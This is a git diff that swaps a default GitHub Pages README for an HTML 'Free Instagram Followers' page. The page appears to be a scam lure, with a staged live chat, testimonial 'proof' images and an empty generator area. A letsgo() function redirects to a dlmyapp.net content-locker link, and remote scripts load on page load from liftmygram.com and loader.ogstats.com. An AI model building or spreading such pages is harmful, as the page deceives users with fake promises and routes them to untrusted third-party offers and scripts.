@@ -1,37 +1,104 @@
-## Welcome to GitHub Pages
-
-You can use the [editor on GitHub](https://github.com/seifou16/freeinsta/edit/master/index.md) to maintain and preview the content for your website in Markdown files.
-
-Whenever you commit to this repository, GitHub Pages will run [Jekyll](https://jekyllrb.com/) to rebuild the pages in your site, from the content in your Markdown files.
-
-### Markdown
-
-Markdown is a lightweight and easy-to-use syntax for styling your writing. It includes conventions for
-
-```markdown
-Syntax highlighted code block
-
-# Header 1
-## Header 2
-### Header 3
-
-- Bulleted
-- List
-
-1. Numbered
-2. List
-
-**Bold** and _Italic_ and `Code` text
-
-[Link](url) and ![Image](src)
-```
-
-For more details see [GitHub Flavored Markdown](https://guides.github.com/features/mastering-markdown/).
-
-### Jekyll Themes
-
-Your Pages site will use the layout and styles from the Jekyll theme you have selected in your [repository settings](https://github.com/seifou16/freeinsta/settings). The name of this theme is saved in the Jekyll `_config.yml` configuration file.
-
-### Support or Contact
-
-Having trouble with Pages? Check out our [documentation](https://help.github.com/categories/github-pages-basics/) or [contact support](https://github.com/contact) and we’ll help you sort it out.
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Free Instagram Followers - raisemygram.com</title><!-- [if lt IE 9]>
+    <script src="//oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+    <script src="//oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script><!-- [endif] -->
+    <link href="http://liftmygram.com/css/_bower.css" rel="stylesheet">
+    <link href="http://liftmygram.com/css/sweetalert.css" rel="stylesheet">
+    <link href="http://liftmygram.com/css/style.css" rel="stylesheet">
+  </head>
+  <body>
+    <div class="container">
+      <div id="generator"></div>
+      <div class="transparent-box">
+        <div class="row">
+          <div class="col-md-12">
+            <h2>Live Chat</h2>
+            <div class="row">
+              <div class="col-md-8 col-md-offset-2">
+                <div class="livechatBox">
+                  <div class="livechatNameBox">
+                    <div class="overlay"></div>
+                    <div class="nameInputBox">
+                      <div class="form-group">
+                        <label for="livechat_name">Nickname</label>
+                        <input id="livechat_name" type="text" placeholder="Enter nickname..." class="form-control livechatName">
+                      </div>
+                      <button class="btn btn-success btn-block livechatNicknameBtn">Submit</button>
+                    </div>
+                  </div>
+                  <div class="row">
+                    <div class="col-md-12">
+                      <div class="heading">
+                        <h3>Instagram Room</h3>
+                      </div>
+                    </div>
+                  </div>
+                  <div class="row">
+                    <div class="col-md-12">
+                      <div class="livechatListArea">
+                        <ul class="chatList"></ul><br class="clearfix">
+                      </div>
+                    </div>
+                  </div>
+                  <div class="row">
+                    <div class="col-md-10">
+                      <input type="text" placeholder="Enter message..." class="form-control input-lg livechatMsg">
+                    </div>
+                    <div class="col-md-2">
+                      <button class="btn btn-success btn-block btn-lg livechatSubmtBtn">Submit</button>
+                    </div>
+                  </div>
+                </div>
+              </div>
+            </div>
+          </div>
+        </div><br class="clearfix">
+      </div>
+      <div class="transparent-box">
+        <div class="row">
+          <div class="col-md-12">
+            <h2>Testimonials</h2>
+          </div>
+        </div>
+        <div class="row">
+          <div class="col-sm-4">
+            <div class="person-review"><img src="http://liftmygram.com/img/person-1.jpg" class="avatar">
+              <h3>William Roman</h3><img src="http://liftmygram.com/img/will.png" class="proof img-responsive">
+            </div>
+          </div>
+          <div class="col-sm-4">
+            <div class="person-review"><img src="http://liftmygram.com/img/person-2.jpg" class="avatar">
+              <h3>Lori Coates</h3><img src="http://liftmygram.com/img/lori.png" class="proof img-responsive">
+            </div>
+          </div>
+          <div class="col-sm-4">
+            <div class="person-review"><img src="http://liftmygram.com/img/person-4.jpg" class="avatar">
+              <h3>Giovanna Jett</h3><img src="http://liftmygram.com/img/gio.png" class="proof img-responsive">
+            </div>
+          </div>
+        </div><br>
+      </div>
+    </div>
+    <footer class="footer">
+      <div class="container">
+        <p class="text-muted">&copy; Copyright 2016 - Present. All rights reserved.</p>
+      </div>
+    </footer>
+    <script>
+	    function letsgo() {
+		    window.location = 'https://www.dlmyapp.net/cl.php?id=fc35fc68249a47f8f968c1ba4d7a5030';
+	    }
+    </script>
+    <script src="http://liftmygram.com/js/scripts.js"></script>
+    <script src="http://liftmygram.com/react/vendors.js"></script>
+    <script src="http://liftmygram.com/react/app.js"></script>
+    
+    <script>var _webzone = "C2bel7m6gjXcu5C";</script>
+<script src="//loader.ogstats.com"></script>
+  </body>
+</html>
